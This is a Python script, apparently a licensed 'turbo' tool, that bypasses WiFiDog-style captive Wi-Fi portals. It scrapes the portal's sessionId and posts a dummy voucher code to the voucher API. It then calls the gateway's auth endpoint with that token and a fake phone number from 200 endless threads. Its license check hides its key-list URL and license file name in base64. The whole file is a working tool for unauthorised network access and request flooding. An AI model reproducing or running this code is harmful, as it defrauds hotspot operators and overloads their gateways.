import requests, re, urllib3, time, threading, os, random, subprocess, sys, base64
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- ENCODED CONFIG ---
# GitHub Link (Hidden)
_0x446 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2tva29hcmthcjQ0Ni1jbG91ZC9TdGFybGluay9yZWZzL2hlYWRzL21haW4va2V5LnR4dA=="
# Hidden License File
_0x112 = "LnN5c3RlbV9jb25maWdfZGF0YV9sb2c="

def get_link(): return base64.b64decode(_0x446).decode()
def get_file(): return base64.b64decode(_0x112).decode()

# --- COLORS ---
Y, G, R, W, C, M, OFF = "\033[1;33m", "\033[1;32m", "\033[1;31m", "\033[1;37m", "\033[1;36m", "\033[1;35m", "\033[0m"

def get_uid():
    try: return subprocess.check_output(['whoami']).decode('utf-8').strip()
    except: return "u0_a128"

def banner(name="GUEST", exp="----/--/-- --:--"):
    os.system('clear')
    print(f"{Y}      ██████╗ ██╗   ██╗██╗     ██╗██╗███████╗")
    print(f"{Y}      ██╔══██╗██║   ██║██║     ██║██║██╔════╝")
    print(f"{G}      ██████╔╝██║   ██║██║     ██║██║█████╗  ")
    print(f"{G}      ██╔══██╗██║   ██║██║██   ██║██║██╔══╝  ")
    print(f"{R}      ██║  ██║╚██████╔╝██║╚█████╔╝██║███████╗")
    print(f"{R}      ╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚════╝ ╚═╝╚══════╝")
    print(f"{W}╔" + "═"*60 + "╗")
    print(f"{W}║ {Y}⚡ DEVICE ID : {Y}{get_uid():<39} {W}║")
    print(f"{W}║ {G}⚡ STATUS    : {G}{'AUTHORIZED':<39} {W}║")
    print(f"{W}║ {R}⚡ EXPIRY    : {R}{exp:<39} {W}║")
    print(f"{W}╚" + "═"*60 + "╝\n")

def check_access():
    uid = get_uid()
    now = datetime.now()
    v_url = get_link()
    v_file = get_file()

    if os.path.exists(v_file):
        try:
            with open(v_file, "r") as f:
                d = f.read().split('|')
                if d[0] == uid:
                    v_name, v_exp_str = d[1], d[2]
                    expire_time = datetime.strptime(v_exp_str, "%Y-%m-%d %H:%M")
                    if now < expire_time:
                        banner(v_name, v_exp_str)
                        return True
        except: pass

    try:
        print(f" {Y}[*] Connecting to secure server...{OFF}")
        res = requests.get(f"{v_url}?t={random.random()}", timeout=10, verify=False)
        if res.status_code == 200:
            for line in res.text.splitlines():
                if uid in line:
                    parts = line.split('|')
                    v_name, v_exp_str = parts[1].strip(), parts[2].strip()
                    expire_time = datetime.strptime(v_exp_str, "%Y-%m-%d %H:%M")
                    if now < expire_time:
                        with open(v_file, "w") as f: f.write(f"{uid}|{v_name}|{v_exp_str}")
                        banner(v_name, v_exp_str)
                        return True
                    else:
                        banner(v_name, v_exp_str)
                        print(f" {R}[!] LICENSE EXPIRED. PLEASE RENEW.{OFF}"); sys.exit()
            
            os.system('clear')
            print(f" {R}╔══════════════════════════════════════════╗")
            print(f" ║          ACCESS DENIED: NO KEY           ║")
            print(f" ╚══════════════════════════════════════════╝{OFF}")
            print(f"\n {Y}[!] REGISTER YOUR DEVICE ID TO ADMIN")
            print(f" {G}⚡ YOUR ID : {C}{uid}{OFF}")
            print(f" {M}[*] Copy your ID and send to Admin.{OFF}")
            sys.exit()
    except:
        print(f" {R}[!] CONNECTION ERROR: INTERNET REQUIRED FOR BOOT.{OFF}"); sys.exit()

def turbo_pulse(link):
    headers = {"User-Agent": "Mozilla/5.0", "Connection": "keep-alive"}
    while True:
        try:
            requests.get(link, timeout=5, verify=False, headers=headers)
            print(f" {Y}[{G}✓{R}] {W}TURBO ACTIVE >>> {C}[{random.randint(10,60)}ms] {OFF}", end="\r")
        except: time.sleep(0.5)

def start_speed_logic():
    session = requests.Session()
    try:
        print(f" {W}[*] {C}Initiating Bypass Sequence...{OFF}")
        r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
        p_url = r.url
        r1 = session.get(p_url, verify=False, timeout=6)
        m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
        n_url = urljoin(p_url, m.group(1)) if m else p_url
        r2 = session.get(n_url, verify=False, timeout=6)
        sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
        
        if sid:
            print(f" {G}[✓] SESSION AUTHORIZED: {sid[:10]}{OFF}")
            p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
            session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
            gw = parse_qs(urlparse(p_url).query).get('gw_address', [urlparse(p_url).netloc.split(':')[0]])[0]
            port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
            auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}&phonenumber=12345"
            
            print(f" {M}[*] ⚡ 200 HEAVY THREADS ENGAGED ⚡{OFF}")
            for _ in range(200):
                threading.Thread(target=turbo_pulse, args=(auth_link,), daemon=True).start()
            while True:
                time.sleep(5)
                if requests.get("http://google.com", timeout=5).status_code != 200: break
        else:
            print(f" {R}[!] SESSION ERROR. RETRYING...{OFF}"); time.sleep(2); start_speed_logic()
    except: time.sleep(3); start_speed_logic()

if __name__ == "__main__":
    if check_access():
        start_speed_logic()
